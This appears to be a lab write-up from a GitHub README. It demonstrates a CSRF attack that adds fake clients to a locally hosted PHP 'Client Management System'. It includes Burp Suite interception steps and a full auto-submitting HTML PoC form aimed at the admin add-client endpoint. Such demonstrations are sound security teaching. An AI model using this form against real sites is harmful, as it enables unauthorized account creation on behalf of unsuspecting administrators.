# CSRF-Leads-to-Create-Fake-Users
CSRF can create fake users by tricking an authenticated user into submitting a malicious request. The web app trusts the session, allowing unauthorized account creation, leading to privilege escalation or spam. Mitigation includes CSRF tokens, Same Site cookies, and authentication checks like CAPTCHAs.

# Set up the Environment
Locally host a website named Client Management System using MySQL and PHP.
Ensure the website includes functionality for adding the clients and their services.

# Login as Admin
By using the given username and password into the Client Management System
![Login as admin](https://github.com/user-attachments/assets/a52b86de-a945-424a-89fc-ef538af11ac0)

# Add the new Client
Select the add client option and enter the required client details.
![adding new  client](https://github.com/user-attachments/assets/f4589658-3bc8-485b-beec-f58280c63c91)
![enter the client details](https://github.com/user-attachments/assets/a0a89e2d-743a-4bf0-887d-24ed8c9629d5)

# Capture the Client adding Request
1.Navigate to the Save button on the website
2.Before clicking the Save button, Set up Burp Suite to intercept the request
3.Click the Save button and capture the HTTP request, before it hit the server
4.Send the captured request to the Repeater tab in Burp Suite for the analysis
![capturing the request in burp](https://github.com/user-attachments/assets/2c3978f6-8518-4ca1-89c3-cc7a22a7cebe)
![send to repeater'](https://github.com/user-attachments/assets/be30ff6c-4dc5-4f18-af61-11bd81c526d1)

# HTML Code for User1
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://localhost/clientms/admin/add-client.php" method="POST">
      <input type="hidden" name="accounttype" value="Active&#32;Account" />
      <input type="hidden" name="cname" value="moulimurugan" />
      <input type="hidden" name="comname" value="kppr" />
      <input type="hidden" name="address" value="vijayamangalam" />
      <input type="hidden" name="city" value="erode" />
      <input type="hidden" name="state" value="tamil" />
      <input type="hidden" name="zcode" value="638026" />
      <input type="hidden" name="wphnumber" value="968560710" />
      <input type="hidden" name="cellphnumber" value="6931052465" />
      <input type="hidden" name="ophnumber" value="9638560410" />
      <input type="hidden" name="email" value="moulimurugan&#64;gmail&#46;com" />
      <input type="hidden" name="password" value="moulimurugan" />
      <input type="hidden" name="websiteadd" value="clientmsdb" />
      <input type="hidden" name="notes" value="Nil" />
      <input type="hidden" name="submit" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

# Creating the fake users
Edit the existing details of client1 to client2 (fake_user1), client3 (fake_user2), in the above HTML code
![in repeater we add new user 1 with new usernam](https://github.com/user-attachments/assets/4b45fb41-3c40-4a6b-9dcf-525fc02eceaa)
![in repeater we add new user 2 with new usernam](https://github.com/user-attachments/assets/feb6cc10-f6b7-4276-ba5f-41e026f3fba2)
![copy and paste the link in browser](https://github.com/user-attachments/assets/6a3c2e60-b89e-4d2a-a0a6-b159dcca2c1a)

# Test the CRRF PoC
1.Open the link which generated in above PoCs
2.Then the webpage open with the submit button
![copy and paste the link in browser](https://github.com/user-attachments/assets/68b10332-3cc8-4d9c-8ccf-46af830ad9ba)
![hit the submit request button](https://github.com/user-attachments/assets/59d29d18-7911-4f2b-b115-38946be339f8)

# Created Fake Clients
When we hit the submit button the new fake client is added to the dashboard. We can see in the following PoCs.
![clients are added](https://github.com/user-attachments/assets/ce96ec9b-4f7d-470c-89ed-a63bb79a341f)
![in dashboard we can see in single request multiple user are created](https://github.com/user-attachments/assets/878be82c-87de-4201-aa4f-c08ed785fc20)
